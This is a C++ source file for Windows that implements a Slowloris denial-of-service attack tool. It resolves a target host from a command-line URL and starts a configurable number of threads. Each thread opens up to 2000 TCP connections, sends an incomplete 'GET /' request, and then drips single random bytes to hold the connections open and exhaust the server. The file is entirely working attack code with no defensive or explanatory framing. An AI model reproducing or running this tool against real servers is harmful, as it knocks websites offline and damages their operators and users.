#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <thread>
#include <winsock2.h>
#include <vector>
#include <string>
#include <algorithm>
#include <iterator>

#pragma comment(lib, "Ws2_32.lib")

int threads = 12;
int connections = 2000;

class InputParser {
  public:
    InputParser(int& argc, char** argv) { for (int i = 1; i < argc; ++i) this->tokens.push_back(std::string(argv[i])); }
    const std::string& get_arg(const std::string& option) {
      std::vector<std::string>::const_iterator itr;
      itr = std::find(this->tokens.begin(), this->tokens.end(), option);
      if (itr != this->tokens.end() && ++itr != this->tokens.end()) return *itr;
      return std::string("");
    }
    bool arg_exists(const std::string& option) { return std::find(this->tokens.begin(), this->tokens.end(), option)  != this->tokens.end(); }
  private:
    std::vector <std::string> tokens;
};

void slowloris(PVOID p) {
  std::vector<SOCKET> sockets;
  sockaddr_in* socket_address = (sockaddr_in*)p;
  char header[] = "GET /";
  while (true) {
    std::chrono::milliseconds timeout((rand() % 10000 + 1) + 1000);
    if (sockets.size() < 2000) {
      for (int i = sockets.size(); i < 2000; i++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s != INVALID_SOCKET) {
          sockets.push_back(s);
          connect(s, (sockaddr*)socket_address, sizeof(sockaddr_in));
          send(s, header, sizeof(header) - 1, NULL);
        }
      }
    }
    for (int i = 0; i < sockets.size();) {
      char next_value = 'a' + rand() % 26;
      int bytes_sent = send(sockets[i], &next_value, 1, NULL);
      if (bytes_sent < 0) {
        closesocket(sockets[i]);
        sockets.erase(sockets.begin() + i);
      }
      else i++;
    }
    std::this_thread::sleep_for(timeout);
  }
}

int main(int argc, char* argv[]) {
  srand(time(NULL));
  WSADATA wsaData;
  auto foo = WSAStartup(MAKEWORD(2, 2), &wsaData);
  if (!foo) {
    InputParser input(argc, argv);
    std::string url;
    if (input.arg_exists("-t")) threads = atoi(input.get_arg("-t").c_str());
    if (input.arg_exists("-u")) url = input.get_arg("-u");
    if (!url.rfind("http://", 0)) url = url.substr(7);
    else if (!url.rfind("https://", 0)) url = url.substr(8);
    hostent* host = gethostbyname(url.c_str());
    sockaddr_in socket_address;
    socket_address.sin_addr.S_un.S_addr = *(PULONG)host->h_addr;
    socket_address.sin_family = AF_INET;
    if (input.arg_exists("-p")) socket_address.sin_port = htons(strtoul(input.get_arg("-p").c_str(), NULL, 0));
    else socket_address.sin_port = htons(strtoul("80", NULL, 0));
    std::vector<std::thread> thread_vector;
    for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris, &socket_address));
    for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
  }
}
